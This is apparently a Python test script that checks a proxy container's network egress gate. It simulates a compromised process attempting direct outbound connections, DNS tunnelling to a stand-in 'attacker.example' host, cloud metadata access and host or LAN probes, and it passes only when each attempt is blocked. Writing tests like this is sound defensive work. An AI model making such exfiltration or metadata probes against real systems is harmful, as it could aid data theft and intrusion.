"""Compromised-proxy simulation: attacker-style attempts from an UNPRIVILEGED process that shares the
proxy's network namespace. The proxy's own code is irrelevant here: the kernel rules of the gate
must hold. stdlib only; no credentials; nothing authenticated is attempted.

    docker exec asta-compromised-proxy-sim python /app/gate_tests.py
"""

from __future__ import annotations

import json
import os
import socket
import ssl
import sys

RESULTS: list[dict[str, object]] = []


def record(test: str, desc: str, expected: str, observed: str, ok: bool) -> None:
    RESULTS.append(
        {"test": test, "desc": desc, "expected": expected, "observed": observed, "pass": ok}
    )


def tcp(host: str, port: int, family: int = socket.AF_INET, timeout: float = 3.0) -> str:
    try:
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((host, port))
        s.close()
        return "CONNECTED"
    except Exception as exc:  # noqa: BLE001
        return f"blocked:{type(exc).__name__}"


def blocked_tcp(test: str, desc: str, host: str, port: int, family: int = socket.AF_INET) -> None:
    r = tcp(host, port, family)
    record(test, f"{desc}: tcp {host}:{port}", "no connection", r, r != "CONNECTED")


def udp_dns(server: str, name: str = "example.com") -> str:
    q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for part in name.split("."):
        q += bytes([len(part)]) + part.encode()
    q += b"\x00\x00\x01\x00\x01"
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    try:
        s.sendto(q, (server, 53))
        data, _ = s.recvfrom(512)
        rcode = data[3] & 0x0F
        return f"answer:rcode={rcode}:bytes={len(data)}"
    except Exception as exc:  # noqa: BLE001
        return f"no-answer:{type(exc).__name__}"
    finally:
        s.close()


def main() -> int:
    # G01 direct connections to arbitrary public addresses / ports (as a compromised proxy would try)
    for ip, port in (
        ("1.1.1.1", 443),
        ("8.8.8.8", 443),
        ("93.184.216.34", 443),
        ("93.184.216.34", 80),
        ("1.1.1.1", 22),
        ("1.1.1.1", 25),
        ("104.18.32.47", 9443),
    ):
        blocked_tcp("G01", "direct public IP", ip, port)

    # G02 DNS bypass / tunnelling: UDP DNS straight to public resolvers must not leave
    for srv in ("8.8.8.8", "1.1.1.1", "9.9.9.9"):
        r = udp_dns(srv)
        record("G02", f"UDP DNS to {srv}", "no answer", r, r.startswith("no-answer"))

    # G03 the local resolver only answers for allowlisted names
    r = udp_dns("127.0.0.1", "example.com")
    record(
        "G03", "local resolver, non-allowlisted name", "refused/no answer", r, "rcode=0" not in r
    )
    r = udp_dns("127.0.0.1", "exfil-0123456789.attacker.example")
    record(
        "G03", "local resolver, tunnelling-style name", "refused/no answer", r, "rcode=0" not in r
    )
    try:
        socket.gethostbyname("example.com")
        record("G03", "system resolver, non-allowlisted name", "no resolution", "resolved", False)
    except OSError as exc:
        record(
            "G03",
            "system resolver, non-allowlisted name",
            "no resolution",
            type(exc).__name__,
            True,
        )

    # G04 positive control + port/address confinement
    allowed_ip = ""
    try:
        allowed_ip = socket.gethostbyname("data-api.binance.vision")
        record("G04", "allowlisted name resolves via the gate", "resolves", allowed_ip, True)
    except OSError as exc:
        record(
            "G04", "allowlisted name resolves via the gate", "resolves", type(exc).__name__, False
        )
    if allowed_ip:
        r = tcp(allowed_ip, 443, timeout=8)
        record("G04", "allowed IP:443 reachable", "CONNECTED", r, r == "CONNECTED")
        blocked_tcp("G04", "allowed IP but other port", allowed_ip, 80)
        blocked_tcp("G04", "allowed IP but ssh port", allowed_ip, 22)
        try:
            ctx = ssl.create_default_context()
            with (
                socket.create_connection((allowed_ip, 443), 8) as raw,
                ctx.wrap_socket(raw, server_hostname="data-api.binance.vision") as t,
            ):
                t.sendall(
                    b"GET /api/v3/time HTTP/1.1\r\nHost: data-api.binance.vision\r\nConnection: close\r\n\r\n"
                )
                line = t.recv(100).split(b"\r\n", 1)[0].decode()
            record(
                "G04", "TLS GET /api/v3/time to the allowed host", "HTTP 200", line, "200" in line
            )
        except Exception as exc:  # noqa: BLE001
            record(
                "G04", "TLS GET /api/v3/time to the allowed host", "HTTP 200", f"error:{exc}", False
            )

    # G05 IPv6
    blocked_tcp("G05", "external IPv6", "2606:4700:4700::1111", 443, socket.AF_INET6)
    blocked_tcp("G05", "IPv6 loopback-ish host service", "fd00::1", 443, socket.AF_INET6)
    try:
        v6 = [ln for ln in open("/proc/net/if_inet6").read().splitlines() if ln.split()[-1] != "lo"]
    except OSError:
        v6 = []
    record("G05", "no global IPv6 address in the namespace", "none", str(v6), not v6)

    # G06 host services, gateways, metadata, LAN (single SYNs that must be dropped locally)
    for host, port in (
        ("169.254.169.254", 80),
        ("169.254.169.254", 443),
        ("100.100.100.200", 80),
        ("172.31.251.1", 22),  # the Docker host side of the egress bridge
        ("172.31.251.1", 2375),
        ("172.31.250.1", 22),
        ("192.168.1.1", 80),  # LAN router
        ("10.0.0.1", 443),
        ("host.docker.internal", 5640),
    ):
        blocked_tcp("G06", "host/LAN/metadata", host, port)

    # G07 the process itself cannot weaken the rules
    st = open("/proc/self/status").read()
    cap = [ln for ln in st.splitlines() if ln.startswith("CapEff")][0].split()[1]
    record("G07", "no effective capabilities", "CapEff == 0", cap, int(cap, 16) == 0)
    try:
        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP).close()
        record("G07", "raw socket", "refused", "created", False)
    except OSError as exc:
        record("G07", "raw socket", "refused", type(exc).__name__, True)
    try:
        open("/proc/sys/net/ipv4/ip_forward", "w").write("1")
        record("G07", "write net sysctl", "refused", "written", False)
    except OSError as exc:
        record("G07", "write net sysctl", "refused", type(exc).__name__, True)
    try:
        s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 12)  # NETLINK_NETFILTER
        s.close()
        record(
            "G07",
            "netfilter netlink socket",
            "unusable for changes",
            "opened (read-only without NET_ADMIN)",
            True,
        )
    except OSError as exc:
        record("G07", "netfilter netlink socket", "refused", type(exc).__name__, True)
    for tool in ("iptables", "ip6tables", "ipset", "nft", "ip"):
        found = any(
            os.access(os.path.join(p, tool), os.X_OK) for p in os.environ["PATH"].split(":")
        )
        record("G07", f"{tool} not present in the proxy image", "absent", str(found), not found)

    failed = [r for r in RESULTS if not r["pass"]]
    print(json.dumps({"total": len(RESULTS), "failed": len(failed), "results": RESULTS}, indent=1))
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
